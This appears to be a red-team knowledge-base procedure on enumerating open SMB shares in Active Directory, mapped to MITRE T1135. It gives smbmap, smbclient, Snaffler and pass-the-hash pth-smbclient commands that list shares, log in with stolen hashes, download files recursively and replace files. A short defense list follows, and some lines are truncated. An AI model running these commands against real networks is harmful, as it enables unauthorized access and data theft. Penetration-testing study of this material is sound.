---
id: bf8a59bb-716a-41c3-9e40-e245b4d33704
name: Open Shares Enumeration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.266564+00:00'
updated_at: '2023-04-10T20:26:35.757799+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Network Share Discovery|T1135 - Network Share Discovery]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Open Shares]]'
commands:
- '[[Connect to C$ folder]]'
- '[[Connect to Share folder]]'
- '[[Download files]]'
- '[[List files]]'
- '[[List Files in Folder]]'
- '[[List SMB Shares]]'
- '[[Move inside a folder]]'
- '[[Replace a file]]'
- '[[Select Share and Navigate to Folder]]'
- '[[SMBMap with domain credentials]]'
- '[[SMBMap with guest session]]'
- '[[SMBMap with null session]]'
- '[[SMBMap with recursive listing]]'
- '[[Snaffle all the computers in the domain]]'
- '[[Snaffle a specific directory]]'
- '[[Snaffle specific computers]]'
---

# Open Shares Enumeration

## Summary

Open Shares Enumeration is a technique used to identify open network shares on a target system. This can be used to gain access to sensitive files and information. An attacker can use SMB Enumeration commands to identify open shares and connect to them using tools like pth-smbclient, SMB Client, or

## Description

# Description

Open Shares Enumeration is a technique used to identify open network shares on a target system. This can be used to gain access to sensitive files and information. An attacker can use SMB Enumeration commands to identify open shares and connect to them using tools like pth-smbclient, SMB Client, or Snaffler. The business value of this technique is that it can be used to gain access to sensitive information that can be used for further attacks.

 

## Requirements

1. Access to the target network

1. SMB Enumeration commands

1. Tools like pth-smbclient, SMB Client, or Snaffler

 

## Defense

1. Disable unnecessary SMB shares

1. Implement proper access controls on sensitive files and folders

1. Monitor network for suspicious SMB activity

 

## Objectives

1. Identify open network shares on a target system

1. Gain access to sensitive files and information

 

# Instructions

1. Use these commands to enumerate SMB shares on a target system.

 



**Code**: [[smbmap -H 10.10.10.10                # null sessio]]



> - `smbmap -H 10.10.10.10`: This command will attempt a null session connection to the target system and list available shares.
- `smbmap -H 10.10.10.10 -R`: This command will perform a recursive listing of all shares on the target system.
- `smbmap -H 10.10.10.10 -u invaliduser`: This command will attempt to connect to the target system using a guest SMB session.
- `smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"`: This command will attempt to connect to the target system using the specified domain, username, and password.



**Command** ([[SMBMap with null session]]):

```bash
smbmap -H 10.10.10.10
```





**Command** ([[SMBMap with recursive listing]]):

```bash
smbmap -H 10.10.10.10 -R
```





**Command** ([[SMBMap with guest session]]):

```bash
smbmap -H 10.10.10.10 -u invaliduser
```





**Command** ([[SMBMap with domain credentials]]):

```bash
smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
```



2. The pth-smbclient command is used to access SMB shares by performing Pass-The-Hash attacks. The -U option specifies the username and hash to be used for authentication. The IP address and the name of the share should be specified after the -U option. The 'ls' command is used to list files in the current directory. The 'cd' command is used to move inside a folder. The 'get' command is used to download files from the share. The 'put' command is used to replace a file on the share.

 



**Code**: [[pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404e]]



> The pth-smbclient command is used to access SMB shares by performing Pass-The-Hash attacks. The -U option specifies the username and hash to be used for authentication. The IP address and the name of the share should be specified after the -U option. The 'ls' command is used to list files in the current directory. The 'cd' command is used to move inside a folder. The 'get' command is used to download files from the share. The 'put' command is used to replace a file on the share.



**Command** ([[Connect to Share folder]]):

```bash
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
```





**Command** ([[Connect to C$ folder]]):

```bash
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
```





**Command** ([[List files]]):

```bash
ls
```





**Command** ([[Move inside a folder]]):

```bash
cd
```





**Command** ([[Download files]]):

```bash
get
```





**Command** ([[Replace a file]]):

```bash
put
```



3. This command lists all the available SMB shares on a remote host and then allows you to connect to a specific share and navigate through its directories. To use this command, replace the IP address '10.10.10.100' with the IP address of the remote host you want to connect to. Once you have identified the share you want to connect to, use the 'use Sharename' command to connect to it. You can then navigate through the share's directories using the 'cd Folder' command and list the files using the 'ls' command.

 



**Code**: [[smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
     ]]



> This command is useful for identifying and connecting to SMB shares on a remote host. SMB shares are commonly used to share files and printers between computers on a network. By connecting to a share, you can access its files and folders as if they were on your own computer. This can be useful for transferring files between computers or accessing shared resources.



**Command** ([[List SMB Shares]]):

```bash
smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
```





**Command** ([[Select Share and Navigate to Folder]]):

```bash
use Sharename
cd Folder
```





**Command** ([[List Files in Folder]]):

```bash
ls
```



4. Use the smbclient command to access SMB/CIFS resources on servers. Use the -U option to specify the username to use for authentication. Use the //server/share syntax to specify the server and share to connect to. Use the mask command to specify the files to download. Use the recurse command to download folders recursively. Use the prompt command to turn off confirmation prompts. Use the lcd command to change the local directory to save the downloaded files. Use the mget command to download the specified files.

 



**Code**: [[smbclient -U username //10.0.0.1/SYSVOL
smbclient ]]



> The smbclient command is a powerful tool for accessing SMB/CIFS resources on servers. It can be used to download files and folders recursively, and can be customized with a variety of commands to suit your needs. When using smbclient, it is important to specify the correct server and share to connect to, as well as the username to use for authentication. The mask command can be used to specify the files to download, while the recurse command can be used to download folders recursively. The prompt command can be used to turn off confirmation prompts, while the lcd command can be used to change the local directory to save the downloaded files. Finally, the mget command can be used to download the specified files.

5. Use the Snaffler command to find sensitive information on a network.

 



**Code**: [[snaffler.exe -s - snaffler.log

The Snaffler comma]]



> The Snaffler command has various arguments to specify the search criteria. The -s argument specifies to search for sensitive information. The -i argument can be used to specify a specific directory to search. The -d argument can be used to specify the domain to search. The -c argument can be used to specify the domain controller to use for the search. The -n argument can be used to specify specific computers to search.



**Command** ([[Snaffle all the computers in the domain]]):

```bash
./Snaffler.exe -d domain.local -c <DC> -s
```





**Command** ([[Snaffle specific computers]]):

```bash
./Snaffler.exe -n computer1,computer2 -s
```





**Command** ([[Snaffle a specific directory]]):

```bash
./Snaffler.exe -i C:\ -s
```



## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Network Share Discovery|T1135 - Network Share Discovery]]

## Commands Used

- [[Connect to C$ folder]]
- [[Connect to Share folder]]
- [[Download files]]
- [[List files]]
- [[List Files in Folder]]
- [[List SMB Shares]]
- [[Move inside a folder]]
- [[Replace a file]]
- [[Select Share and Navigate to Folder]]
- [[SMBMap with domain credentials]]
- [[SMBMap with guest session]]
- [[SMBMap with null session]]
- [[SMBMap with recursive listing]]
- [[Snaffle all the computers in the domain]]
- [[Snaffle a specific directory]]
- [[Snaffle specific computers]]

## Tags

- [[Active Directory Attacks]]
- [[Open Shares]]


